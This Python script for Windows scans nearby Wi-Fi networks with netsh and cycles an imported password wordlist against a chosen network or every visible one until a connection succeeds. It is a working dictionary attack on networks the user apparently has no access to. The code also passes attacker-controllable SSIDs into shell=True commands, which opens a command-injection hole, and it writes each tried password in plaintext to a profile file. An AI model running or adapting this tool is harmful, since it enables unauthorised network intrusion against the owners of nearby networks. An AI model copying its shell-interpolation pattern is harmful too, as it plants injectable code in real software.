import requests
import subprocess
import time

from Colors import bcolors
import passwords

def connect_to_wifi(ssid, password):
    
    print(f" ➡️ {bcolors.OKCYAN}"+ssid+f"{bcolors.ENDC}:{bcolors.CYAN}"+password+f"{bcolors.ENDC}")
    
    try:
        # Connect to the Wi-Fi network using netsh
        command = f'netsh wlan set hostednetwork mode=disallow'
        subprocess.run(command, shell=True, capture_output=True, text=True)  # Disable hosted network if it's on
        
        # Create a profile
        create_wifi_profile(ssid, password, "wifiprofile.xml")
        subprocess.run(f'netsh wlan add profile filename=wifiprofile.xml', shell=True, capture_output=True, text=True)

        # Try to connect
        connect_command = f'netsh wlan connect ssid={ssid} interface=Wi-Fi name={ssid}'
        result = subprocess.run(connect_command, shell=True, capture_output=True, text=True)
        
        time.sleep(10)
        
        if is_connected():
            print(f"  ✅ {bcolors.OKGREEN}Success{bcolors.ENDC}.")
            return True
        
        return False

    except Exception as e:
        print(f"An error occurred while trying to connect to {ssid}: {str(e)}")
        return False

def create_wifi_profile(ssid, password, filename):
    
    xml_content = f'''<?xml version="1.0"?>
        <WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
            <name>{ssid}</name>
            <SSIDConfig>
                <SSID>
                    <name>{ssid}</name>
                </SSID>
            </SSIDConfig>
            <connectionType>ESS</connectionType>
            <connectionMode>auto</connectionMode>
            <MSM>
                <security>
                    <authEncryption>
                        <authentication>WPA2PSK</authentication>
                        <encryption>AES</encryption>
                        <useOneX>false</useOneX>
                    </authEncryption>
                    <sharedKey>
                        <keyType>passPhrase</keyType>
                        <protected>false</protected>
                        <keyMaterial>{password}</keyMaterial>
                    </sharedKey>
                </security>
            </MSM>
            <MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3">
                <enableRandomization>false</enableRandomization>
            </MacRandomization>
        </WLANProfile>
    '''
    
    with open(filename, 'w') as f:
        f.write(xml_content)

def is_connected():
    try:
        response = requests.get('https://www.google.com')
        return int(response.status_code) == 200
    except Exception as e:
        # print(str(e))
        return False

def list_wifi_networks():
    
    # Run the netsh command to list available Wi-Fi networks
    command = "netsh wlan show networks mode=bssid"
    result = subprocess.run(command, capture_output=True, text=True, shell=True)
    
    # Extract SSIDs from the output
    networks = {}
    currentSSID = ""
    
    for line in result.stdout.splitlines():
        
        line = line.strip()

        if line.startswith("SSID"):
            s = line.split(":")[1].strip()
            networks[s] = {'SSID': s}
            currentSSID = s
        
        elif line.startswith("Signal"):
            s = line.split(":")[1].strip()
            networks[currentSSID]['Signal'] = s

        elif line.startswith("Authentication"):
            s = line.split(":")[1].strip()
            networks[currentSSID]['Authentication'] = s

        elif line.startswith("Encryption"):
            s = line.split(":")[1].strip()
            networks[currentSSID]['Encryption'] = s

        elif line.startswith("BSSID"):
            s = line.split(":")[1].strip()
            networks[currentSSID]['BSSID'] = s

        elif line.startswith("Band"):
            s = line.split(":")[1].strip()
            networks[currentSSID]['Band'] = s

        elif line.startswith("Signal"):
            s = line.split(":")[1].strip()
            networks[currentSSID]['Signal'] = s

        elif line.startswith("Radio type"):
            s = line.split(":")[1].strip()
            networks[currentSSID]['Radio Type'] = s
    
    # Sort by highest signal strength
    sorted_networks = sorted(networks.items(), key=lambda x: int(x[1].get('Signal', '0').replace('%', '').strip()), reverse=True)
    sorted_network_dict = {ssid: details for ssid, details in sorted_networks}
    
    return sorted_network_dict

def thinBorderBlue():
    print(f"{bcolors.BLUE}+{bcolors.ENDC}" + (f"{bcolors.BLUE}-{bcolors.ENDC}{bcolors.BLUE}-{bcolors.ENDC}{bcolors.CYAN}-{bcolors.ENDC}{bcolors.OKCYAN}-{bcolors.ENDC}{bcolors.CYAN}-{bcolors.ENDC}{bcolors.BLUE}-{bcolors.ENDC}{bcolors.BLUE}-{bcolors.ENDC}" * 12) + f"{bcolors.ENDC}{bcolors.BLUE}+{bcolors.ENDC}")

def main():
    
    thinBorderBlue()
    
    # List available Wi-Fi networks
    networks = []
    while not networks:
        networks = list_wifi_networks()
        print(f" Detecting [{bcolors.WARNING}"+str(len(networks))+f"{bcolors.ENDC}] networks...")
        if not networks:
            time.sleep(5)

    thinBorderBlue()

    # Print available networks
    print(" Available Wi-Fi Networks:")
    ssids = []
    i = 1
    for ssid in networks:
        print(f" {bcolors.WARNING}{i}{bcolors.ENDC}. "+f"{bcolors.OKCYAN}"+networks[ssid]["SSID"]+f"{bcolors.ENDC}",end="")
        if networks[ssid]["Authentication"]:
            print(f" (🔒 {bcolors.WARNING}"+networks[ssid]["Authentication"]+f"{bcolors.ENDC})",end="")
        if networks[ssid]["Encryption"]:
            print(f" ({bcolors.YELLOW}"+networks[ssid]["Encryption"]+f"{bcolors.ENDC})",end="")
        if networks[ssid]["Band"]:
            print(f" ({bcolors.WARNING}"+networks[ssid]["Band"]+f"{bcolors.ENDC})",end="")
        if networks[ssid]["Signal"]:
            number = int((networks[ssid]["Signal"]).replace('%', ''))
            if number > 90:
                print(f" ({bcolors.OKGREEN}"+networks[ssid]["Signal"]+f"{bcolors.ENDC})",end="")
            elif number > 70:
                print(f" ({bcolors.GREEN}"+networks[ssid]["Signal"]+f"{bcolors.ENDC})",end="")
            else:
                print(f" ({bcolors.FAIL}"+networks[ssid]["Signal"]+f"{bcolors.ENDC})",end="")
        print("")
        i+=1
        ssids.append(ssid)

    thinBorderBlue()

    # Ask the user to select a network to connect to
    userInput = input(f" Select a network, or input all ({bcolors.OKGREEN}a{bcolors.ENDC}) to try them all: {bcolors.OKGREEN}")
    print(f"{bcolors.ENDC}",end="")
    
    thinBorderBlue()
    
    if userInput:
        if userInput == "a":
            # Cycle through all available networks trying them all
            for password in passwords.wifiPasswords:
                for ssid in ssids:
                    if connect_to_wifi(ssid, password):
                        return
        else:
            # Focus on selected network only
            selected_index = int(userInput) - 1
            selected_ssid = ssids[selected_index]
            # password = input(f"{bcolors.ENDC}Enter the password for {bcolors.OKCYAN}{selected_ssid}{bcolors.ENDC}: {bcolors.OKGREEN}")
            # print(f"{bcolors.ENDC}")
            for password in passwords.wifiPasswords:
                if connect_to_wifi(selected_ssid, password):
                    return

main()